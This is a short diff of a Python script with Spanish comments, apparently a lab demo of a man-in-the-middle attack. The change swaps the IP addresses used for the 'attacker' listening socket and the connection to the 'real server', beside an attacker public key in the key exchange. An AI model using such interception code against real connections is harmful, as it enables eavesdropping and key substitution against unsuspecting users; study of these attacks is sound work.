@@ -31,11 +31,11 @@ attacker_public_bytes = attacker_public_key.public_bytes(
 
 # Crear sockets para interceptar entre el cliente y el servidor
 server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-server_socket.bind(('192.168.1.15', 65432))  # Escuchar en el dispositivo atacante
+server_socket.bind(('192.168.1.14', 65432))  # Escuchar en el dispositivo atacante
 server_socket.listen()
 
 client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client_socket.connect(('192.168.1.14', 65432))  # Conectar al servidor real
+client_socket.connect(('192.168.1.15', 65432))  # Conectar al servidor real
 
 print("Atacante en espera de conexiones...")
 
